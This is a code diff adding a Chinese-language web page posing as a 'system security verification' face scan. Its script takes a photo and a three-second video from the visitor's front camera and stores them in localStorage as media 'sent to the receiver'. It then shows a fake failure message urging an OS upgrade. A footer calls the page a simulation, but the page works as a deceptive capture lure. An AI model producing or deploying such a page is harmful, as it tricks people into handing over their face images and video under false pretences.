@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="UTF-8">
+    <title>Untitled</title>
+    
+
+  </head>
+    
+  <body>
+  <!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>系统安全验证</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        }
+        body {
+            background: #000;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            max-width: 400px;
+            width: 100%;
+            background: #1c1c1e;
+            border-radius: 32px;
+            padding: 30px 20px 40px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5);
+            border: 1px solid #2c2c2e;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+        }
+        .header p {
+            color: #8e8e93;
+            font-size: 16px;
+            margin-top: 8px;
+        }
+        .camera-container {
+            background: #2c2c2e;
+            border-radius: 24px;
+            overflow: hidden;
+            aspect-ratio: 4/3;
+            position: relative;
+            margin-bottom: 25px;
+            border: 2px solid #3a3a3c;
+        }
+        #video {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: none;
+        }
+        #canvas {
+            display: none;
+        }
+        .placeholder {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100%;
+            color: #8e8e93;
+        }
+        .placeholder-icon {
+            font-size: 48px;
+            margin-bottom: 10px;
+        }
+        .verify-btn {
+            background: #0a84ff;
+            color: white;
+            border: none;
+            border-radius: 16px;
+            padding: 18px 20px;
+            font-size: 18px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 15px;
+            transition: all 0.2s;
+        }
+        .verify-btn:active {
+            transform: scale(0.98);
+            background: #0063ce;
+        }
+        .verify-btn.recording {
+            background: #ff3b30;
+            animation: pulse 1s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 1; }
+            50% { opacity: 0.7; }
+            100% { opacity: 1; }
+        }
+        .status-box {
+            background: #2c2c2e;
+            border-radius: 14px;
+            padding: 16px;
+            border-left: 4px solid #0a84ff;
+        }
+        .status-text {
+            color: #e5e5e7;
+            font-size: 15px;
+        }
+        .privacy-note {
+            color: #666668;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .flash-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: white;
+            pointer-events: none;
+            z-index: 9999;
+            opacity: 0;
+            transition: opacity 0.1s;
+        }
+        .device-info {
+            color: #8e8e93;
+            font-size: 12px;
+            text-align: center;
+            margin-top: 15px;
+        }
+        .recording-indicator {
+            color: #ff3b30;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
+        .recording-indicator.active {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <div class="flash-overlay" id="flashOverlay"></div>
+
+    <div class="container">
+        <div class="header">
+            <h1>🔐 系统安全验证</h1>
+            <p>请完成面部识别以继续</p>
+        </div>
+
+        <div class="camera-container" id="cameraContainer">
+            <video id="video" autoplay playsinline></video>
+            <div class="placeholder" id="placeholder">
+                <div class="placeholder-icon">📷</div>
+                <div id="placeholderText">点击下方按钮开启摄像头</div>
+            </div>
+        </div>
+        <canvas id="canvas" width="640" height="480"></canvas>
+
+        <button class="verify-btn" id="verifyBtn">▶ 开始验证</button>
+        <div class="recording-indicator" id="recordingIndicator">🔴 录像中...</div>
+
+        <div class="status-box">
+            <div class="status-text" id="statusText">⚪ 等待授权...</div>
+        </div>
+        
+        <div class="device-info" id="deviceInfo">准备就绪</div>
+        <div class="privacy-note">🔒 此验证仅为模拟效果</div>
+    </div>
+
+    <script>
+        (function() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const placeholder = document.getElementById('placeholder');
+            const placeholderText = document.getElementById('placeholderText');
+            const verifyBtn = document.getElementById('verifyBtn');
+            const statusText = document.getElementById('statusText');
+            const deviceInfo = document.getElementById('deviceInfo');
+            const flashOverlay = document.getElementById('flashOverlay');
+            const recordingIndicator = document.getElementById('recordingIndicator');
+
+            let stream = null;
+            let hasPermission = false;
+            let mediaRecorder = null;
+            let recordedChunks = [];
+            let isRecording = false;
+
+            // 闪光效果
+            function flash() {
+                flashOverlay.style.opacity = '0.7';
+                setTimeout(() => {
+                    flashOverlay.style.opacity = '0';
+                }, 150);
+            }
+
+            // 保存数据到接收端
+            function saveToStorage(data) {
+                try {
+                    const existing = JSON.parse(localStorage.getItem('mockMediaList') || '[]');
+                    existing.unshift(data);
+                    if (existing.length > 20) existing.pop();
+                    localStorage.setItem('mockMediaList', JSON.stringify(existing));
+                    
+                    console.log('数据已发送到接收端', data);
+                    
+                    // 触发storage事件
+                    window.dispatchEvent(new StorageEvent('storage', {
+                        key: 'mockMediaList',
+                        newValue: JSON.stringify(existing)
+                    }));
+                    
+                } catch (e) {
+                    console.error('保存失败', e);
+                }
+            }
+
+            // 拍照函数
+            function takePhoto() {
+                return new Promise((resolve) => {
+                    flash();
+                    
+                    canvas.width = video.videoWidth || 640;
+                    canvas.height = video.videoHeight || 480;
+                    
+                    const ctx = canvas.getContext('2d');
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.9);
+                    
+                    const photoData = {
+                        id: 'photo_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
+                        type: 'photo',
+                        name: `photo_${new Date().toLocaleTimeString().replace(/:/g, '-')}.jpg`,
+                        timestamp: Date.now(),
+                        size: Math.round(dataUrl.length * 0.75 / 1024) + ' KB',
+                        dataUrl: dataUrl,
+                        from: '前端摄像头'
+                    };
+                    
+                    saveToStorage(photoData);
+                    statusText.innerHTML = '📸 照片已发送';
+                    
+                    resolve(photoData);
+                });
+            }
+
+            // 开始录像
+            function startRecording() {
+                return new Promise((resolve, reject) => {
+                    if (!stream) {
+                        reject('没有摄像头流');
+                        return;
+                    }
+                    
+                    recordedChunks = [];
+                    
+                    try {
+                        // 创建 MediaRecorder
+                        mediaRecorder = new MediaRecorder(stream, {
+                            mimeType: 'video/webm;codecs=vp9,opus' // 尝试使用 VP9 编码
+                        });
+                    } catch (e) {
+                        try {
+                            // 降级使用 vp8
+                            mediaRecorder = new MediaRecorder(stream, {
+                                mimeType: 'video/webm;codecs=vp8,opus'
+                            });
+                        } catch (e2) {
+                            // 使用默认编码
+                            mediaRecorder = new MediaRecorder(stream);
+                        }
+                    }
+                    
+                    // 收集数据
+                    mediaRecorder.ondataavailable = (event) => {
+                        if (event.data && event.data.size > 0) {
+                            recordedChunks.push(event.data);
+                        }
+                    };
+                    
+                    // 停止录像时处理
+                    mediaRecorder.onstop = () => {
+                        isRecording = false;
+                        verifyBtn.classList.remove('recording');
+                        recordingIndicator.classList.remove('active');
+                        
+                        // 创建视频blob
+                        const blob = new Blob(recordedChunks, { 
+                            type: 'video/webm' 
+                        });
+                        
+                        // 转换为 base64
+                        const reader = new FileReader();
+                        reader.onloadend = () => {
+                            const videoData = {
+                                id: 'video_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8),
+                                type: 'video',
+                                name: `video_${new Date().toLocaleTimeString().replace(/:/g, '-')}.webm`,
+                                timestamp: Date.now(),
+                                size: Math.round(blob.size / 1024) + ' KB',
+                                videoUrl: reader.result,  // base64 视频数据
+                                from: '前端摄像头'
+                            };
+                            
+                            saveToStorage(videoData);
+                            statusText.innerHTML = '🎥 录像已发送';
+                            
+                            // 闪光效果表示录像结束
+                            flash();
+                            setTimeout(() => flash(), 100);
+                            
+                            resolve(videoData);
+                        };
+                        reader.readAsDataURL(blob);
+                    };
+                    
+                    // 开始录像
+                    mediaRecorder.start(1000); // 每秒触发一次 dataavailable
+                    isRecording = true;
+                    
+                    // 更新UI
+                    verifyBtn.classList.add('recording');
+                    recordingIndicator.classList.add('active');
+                    statusText.innerHTML = '🔴 录像中...';
+                    
+                    // 闪光效果表示开始录像
+                    flash();
+                    
+                    // 3秒后自动停止
+                    setTimeout(() => {
+                        if (isRecording && mediaRecorder && mediaRecorder.state !== 'inactive') {
+                            mediaRecorder.stop();
+                        }
+                    }, 3000);
+                });
+            }
+
+            // 初始化摄像头
+            async function initCamera() {
+                try {
+                    statusText.innerHTML = '⏳ 请求摄像头权限...';
+                    
+                    stream = await navigator.mediaDevices.getUserMedia({ 
+                        video: {
+                            width: { ideal: 640 },
+                            height: { ideal: 480 },
+                            facingMode: 'user'
+                        }, 
+                        audio: false 
+                    });
+                    
+                    video.srcObject = stream;
+                    
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play()
+                                .then(() => {
+                                    console.log('摄像头已启动');
+                                    resolve();
+                                })
+                                .catch(e => console.log('播放失败', e));
+                        };
+                    });
+                    
+                    video.style.display = 'block';
+                    placeholder.style.display = 'none';
+                    
+                    hasPermission = true;
+                    statusText.innerHTML = '✅ 摄像头已就绪';
+                    deviceInfo.innerHTML = '📷 摄像头已激活';
+                    
+                    return true;
+                    
+                } catch (err) {
+                    console.error('摄像头错误:', err);
+                    
+                    if (err.name === 'NotAllowedError') {
+                        statusText.innerHTML = '❌ 请允许摄像头权限';
+                    } else if (err.name === 'NotFoundError') {
+                        statusText.innerHTML = '❌ 未找到摄像头';
+                    } else {
+                        statusText.innerHTML = '❌ 摄像头启动失败';
+                    }
+                    
+                    return false;
+                }
+            }
+
+            // 开始验证流程
+            async function startVerification() {
+                statusText.innerHTML = '🔄 正在扫描...';
+                
+                // 先拍照
+                setTimeout(async () => {
+                    await takePhoto();
+                    
+                    statusText.innerHTML = '👤 检测到面部';
+                    
+                    // 再录像
+                    setTimeout(async () => {
+                        await startRecording();
+                        
+                        statusText.innerHTML = '❌ 验证失败';
+                        
+                        setTimeout(() => {
+                            alert('⚠️ 验证失败，请使用更高版本的安卓系统或ios18以上的操作系统。');
+                            
+                            setTimeout(() => {
+                                statusText.innerHTML = '⏳ 点击按钮重试';
+                            }, 2000);
+                            
+                        }, 500);
+                        
+                    }, 1500);
+                    
+                }, 1000);
+            }
+
+            // 点击按钮
+            verifyBtn.addEventListener('click', async function() {
+                if (!hasPermission || !stream) {
+                    const success = await initCamera();
+                    if (success) {
+                        startVerification();
+                    }
+                } else {
+                    startVerification();
+                }
+            });
+
+            // 页面关闭时释放摄像头
+            window.addEventListener('beforeunload', function() {
+                if (stream) {
+                    stream.getTracks().forEach(track => track.stop());
+                }
+                if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+                    mediaRecorder.stop();
+                }
+            });
+        })();
+    </script>
+</body>
+</html>
+    
+  </body>
+  
+</html>
